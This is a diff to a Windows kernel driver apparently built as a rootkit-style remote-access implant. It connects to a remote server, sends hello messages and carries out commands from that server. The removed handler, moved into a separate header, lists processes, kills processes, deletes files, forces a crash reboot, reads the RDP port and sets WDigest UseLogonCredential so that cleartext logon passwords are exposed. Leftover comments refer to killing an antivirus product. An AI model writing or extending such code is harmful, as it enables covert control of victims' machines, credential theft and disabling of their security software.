@@ -31,6 +31,7 @@ VOID InitializeObjectAttributes(
 #include "xlog.h"
 //#include "tcphook.h"
 #include "config.h"
+#include "command.h"
 
 PDEVICE_OBJECT g_pCtrlDO = NULL;
 PKTHREAD g_pnThread;
@@ -39,6 +40,7 @@ PKTHREAD g_mnThread;
 HANDLE die = FALSE;
 PWSK_SOCKET pSocket = NULL;
 DWORD bSocketLocked = FALSE;
+DWORD bSocketClosed = TRUE;
 DWORD timeoutCounter = 0;
 HANDLE hSelfFile;
 
@@ -55,7 +57,8 @@ void DriverUnload(PDRIVER_OBJECT pDriverObject) {
 	xLog("DriverUnload Called");
 	die = TRUE;
 	//stop the system thread
-	if (pSocket != NULL){ 
+	if (pSocket != NULL && !bSocketLocked && !bSocketClosed){
+		InterlockedExchange(&bSocketClosed, TRUE);
 		CloseSocket(pSocket);
 	}
 	UNICODE_STRING usSymbolName;
@@ -222,117 +225,9 @@ NTSTATUS DeviceControlDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 	return status;
 }
 
-#define NETBUFF_LENGTH 20480
-#define CMD_TASKLIST "ps"
-#define CMD_KILL "kill"
-#define CMD_DEL "del"
-#define CMD_REBOOT "reboot"
-#define CMD_QRDP "qrdp"
-#define CMD_SETCLEARTEXT "setct"
-NTSTATUS HandleServerPacket(
-	PCHAR msg,
-	PCHAR pNeedReply
-) {
-	
-	LONG msgLen = strlen(msg);
-	if (msgLen > NETBUFF_LENGTH) {
-		xLog("buffer over flowed");
-		pNeedReply = FALSE;
-		return STATUS_UNSUCCESSFUL;
-	}
-	msg[NETBUFF_LENGTH - 1] = 0;
-	if (msgLen > 0) {
-		if (msg[msgLen - 1] = '\n') {
-			msg[msgLen - 1] = 0;
-		}
-		msgLen--;
-	}
-	//RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "recv length: %ld\n", msgLen);
-	NTSTATUS status = STATUS_INVALID_PARAMETER;
-	if (strncmp(msg, CMD_TASKLIST, strlen(CMD_TASKLIST)) == 0) {
-		status = tasklist_user(msg, NETBUFF_LENGTH);
-	}
-	
-	if (strncmp(msg, CMD_KILL, strlen(CMD_KILL)) == 0) {
-		
-		ANSI_STRING ansipid;
-		RtlInitAnsiString(&ansipid, msg + strlen(CMD_KILL));
-		UNICODE_STRING unipid;
-		RtlAnsiStringToUnicodeString(&unipid, &ansipid, TRUE);
-		DWORD pid = -1;
-		//status = RtlUnicodeStringToInt64(&unipid, 0, &pid, NULL);
-		status = RtlUnicodeStringToInteger(&unipid, 0, &pid);
-		if (NT_SUCCESS(status)) {
-			status = xkill3(pid);
-			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "xkill 3 success return %p\n", status);
-		}
-		RtlFreeUnicodeString(&unipid);
-		
-	}
-	//return STATUS_UNSUCCESSFUL;
-	if (strncmp(msg, CMD_DEL, strlen(CMD_DEL)) == 0) {
-		status = xDelFile3(msg + strlen(CMD_DEL) + 1);
-		
-		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "xdel 3 return %p\n", status);
-		status = STATUS_SUCCESS;
-	}
 
-	if (strncmp(msg, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
-		//nothing will return
-		KeBugCheck(POWER_FAILURE_SIMULATE);
-	}
 
-	if (strncmp(msg, CMD_QRDP, strlen(CMD_QRDP)) == 0) {
-		//query rdp
-		PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
-		//UNICODE_STRING uniV;
-		
-		//RtlInitUnicodeString(&uniV, L"ImagePath");
-		status = queryRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", pKvi, 400);
-		if (NT_SUCCESS(status)) {
-			//xLogL(pKvi->Data, pKvi->DataLength);
-			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "reg read rdp port: %d\n", *((DWORD*)pKvi->Data));
-		}
-		else
-		{
-			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Reg read Error: 0x%p\n", status);
-		}
-		ExFreePoolWithTag(pKvi, 'lreg');
-		status = STATUS_SUCCESS;
-	}
-	if (strncmp(msg, CMD_SETCLEARTEXT, strlen(CMD_SETCLEARTEXT)) == 0) {
-		//set cleartext
-		DWORD cleartextEn = 1;
-		status = setRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", REG_DWORD, &cleartextEn, sizeof(DWORD));
-		if (!NT_SUCCESS(status)) {
-			//xLogL(pKvi->Data, pKvi->DataLength);
-			goto HANDLER_CMD_END;
-		}
-		PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
-		//UNICODE_STRING uniV;
 
-		//RtlInitUnicodeString(&uniV, L"ImagePath");
-		status = queryRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", pKvi, 400);
-		if (NT_SUCCESS(status)) {
-			//xLogL(pKvi->Data, pKvi->DataLength);
-			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "reg read UseLogonCredential key: %d\n", *((DWORD*)pKvi->Data));
-		}
-		else
-		{
-			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Reg read Error: 0x%p\n", status);
-		}
-		ExFreePoolWithTag(pKvi, 'lreg');
-		status = STATUS_SUCCESS;
-	}
-	
-
-HANDLER_CMD_END:
-	if (!NT_SUCCESS(status)) {
-		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Command Execute Failed: 0x%p\n", status);
-	}
-	
-	*pNeedReply = TRUE;
-}
 
 
 NTSTATUS systemThreadProc() {
@@ -379,6 +274,7 @@ CONNECT_SOCKET:
 	//Then, try to connect to the server, if connect failed, goto thread_failed to check whether need to reconnect
 	InterlockedExchange(&bSocketLocked, TRUE);
 	NTSTATUS status = ConnectWsk(&pSocket, (PSOCKADDR)&remoteAddr);
+	
 	InterlockedExchange(&bSocketLocked, FALSE);
 	if (!NT_SUCCESS(status)) {
 		xLog("Connect Failed");
@@ -386,6 +282,7 @@ CONNECT_SOCKET:
 		xLog(msg);
 		goto THREAD_FAILED;
 	}
+	InterlockedExchange(&bSocketClosed, FALSE);
 	//Send 2 hello message to the server, if failed, close socket and wait for reconnect or die
 	RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "lolita winsock kernel message: %p\n", pSocket);
 	status = SendWsk(pSocket, msg, strlen(msg));
@@ -455,14 +352,17 @@ RECV_LOOP:
 
 	//close the socket
 CLOSE_SOCKET:
-	status = CloseSocket(pSocket);
-	if (!NT_SUCCESS(status)) {
-		xLog("Close Failed");
-		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
-		xLog(msg);
-		//ExFreePoolWithTag(msg, 'netb');
-		//PsTerminateSystemThread(STATUS_SUCCESS);
-		//return STATUS_SUCCESS;
+	if (!bSocketClosed) {
+		InterlockedExchange(&bSocketClosed, TRUE);
+		status = CloseSocket(pSocket);
+		if (!NT_SUCCESS(status)) {
+			xLog("Close Failed");
+			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "status code: %p", status);
+			xLog(msg);
+			//ExFreePoolWithTag(msg, 'netb');
+			//PsTerminateSystemThread(STATUS_SUCCESS);
+			//return STATUS_SUCCESS;
+		}
 	}
 
 THREAD_FAILED:
@@ -500,7 +400,8 @@ NTSTATUS monitorThreadProc() {
 			break;
 		}
 		if (timeoutCounter >= 30) {
-			if (pSocket != NULL && !bSocketLocked) {
+			if (pSocket != NULL && !bSocketLocked && !bSocketClosed) {
+				InterlockedExchange(&bSocketClosed, TRUE);
 				CloseSocket(pSocket);
 			}
 			InterlockedExchange(&timeoutCounter, 0);
@@ -741,13 +642,15 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	if (selfContent != NULL) {
 		ExFreePoolWithTag(selfContent, 'self');
 	}
-	//return STATUS_SUCCESS;
 	CLIENT_ID       clientId = { 0 };
-	//xDel1("C:\\test\\1.txt");
-	//kill360_64();
 	initWsk();
-	//DbgPrint("addr %p", queryRegA);
-	//return STATUS_SUCCESS;
+	//******************************************************************Put Your Test Here
+
+
+
+
+
+
 	//create network system thread
 	xLog("Creating System Thread");
 	HANDLE hSysThread = NULL;
@@ -798,6 +701,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	//InstallHook();
 	//return STATUS_SUCCESS;
 	return status;
+	
 }
 
 
